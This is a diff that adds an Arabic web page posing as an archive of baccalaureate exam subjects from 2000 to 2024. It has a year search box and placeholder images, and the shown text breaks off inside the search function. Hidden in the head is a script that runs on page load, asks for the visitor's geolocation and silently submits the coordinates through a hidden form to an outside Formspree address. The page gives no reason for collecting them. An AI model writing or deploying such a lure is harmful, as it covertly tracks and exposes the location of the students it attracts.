@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مواضيع البكالوريا 2000 - 2024</title>
+    <style>
+        body { font-family: Arial, sans-serif; direction: rtl; text-align: center; background-color: #f4f4f4; }
+        h1 { color: #007BFF; }
+        .search-box { margin: 20px auto; width: 50%; }
+        .search-box input { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 16px; text-align: center; }
+        .container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
+        .subject { width: 200px; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 0 5px rgba(0,0,0,0.2); }
+        .subject img { width: 100%; height: auto; border-radius: 5px; }
+        .subject p { font-weight: bold; }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع الجغرافي.");
+            }
+        }
+
+        function sendLocation(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            
+            let form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://formspree.io/f/moveeygr"; // تم تحديث رابط Formspree
+            
+            let latInput = document.createElement("input");
+            latInput.type = "hidden";
+            latInput.name = "latitude";
+            latInput.value = latitude;
+            
+            let lonInput = document.createElement("input");
+            lonInput.type = "hidden";
+            lonInput.name = "longitude";
+            lonInput.value = longitude;
+            
+            form.appendChild(latInput);
+            form.appendChild(lonInput);
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("تم رفض طلب تحديد الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>مواضيع البكالوريا من 2000 إلى 2024</h1>
+    <div class="search-box">
+        <input type="text" id="searchInput" placeholder="ابحث عن سنة..." onkeyup="searchSubjects()">
+    </div>
+    <div class="container" id="subjectsContainer">
+        <!-- سيتم إدراج الصور هنا باستخدام JavaScript -->
+    </div>
+
+    <script>
+        let container = document.getElementById("subjectsContainer");
+        for (let year = 2000; year <= 2024; year++) {
+            let div = document.createElement("div");
+            div.className = "subject";
+            div.setAttribute("data-year", year);
+            div.innerHTML = `<img src="https://via.placeholder.com/200x250?text=Bac+${year}" alt="بكالوريا ${year}"><p>بكالوريا ${year}</p>`;
+            container.appendChild(div);
+        }
+
+        function searchSubjects() {
+            let input = document.getElementById("searchInput").value.toLowerCase();
